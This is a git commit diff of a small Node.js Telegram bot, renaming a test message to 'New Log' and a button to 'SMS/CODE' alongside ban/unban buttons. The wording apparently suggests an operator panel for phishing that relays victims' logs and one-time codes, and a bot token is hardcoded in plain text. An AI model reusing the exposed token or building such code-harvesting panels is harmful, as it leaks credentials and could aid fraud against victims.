bd8531897e0b05bc005a602e4af27e1bc5391225
yaebalnunahui-design <yaebalnunahui@gmail.com>
2026-04-16 17:25:17 +0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -4,8 +4,9 @@ const token = "8589160707:AAEHCqUhzfom1D3_gtlG5eTiIrtPnXCGnNk";
 
 const bot = new TelegramBot(token, { polling: true });
 
+// тест команды
 bot.onText(/\/test/, (msg) => {
-  bot.sendMessage(msg.chat.id, "🆕 ТЕСТ ЗАЯВКА", {
+  bot.sendMessage(msg.chat.id, "🆕 Новый Лог", {
     reply_markup: {
       inline_keyboard: [
         [
@@ -13,13 +14,14 @@ bot.onText(/\/test/, (msg) => {
           { text: "✅ Разбан", callback_data: "unban_123" }
         ],
         [
-          { text: "➡️ Дальше", callback_data: "allow_123" }
+          { text: "➡️ СМС/КОД", callback_data: "allow_123" }
         ]
       ]
     }
   });
 });
 
+// кнопки (пока просто лог)
 bot.on("callback_query", (q) => {
   console.log("CLICK:", q.data);
   bot.answerCallbackQuery(q.id);
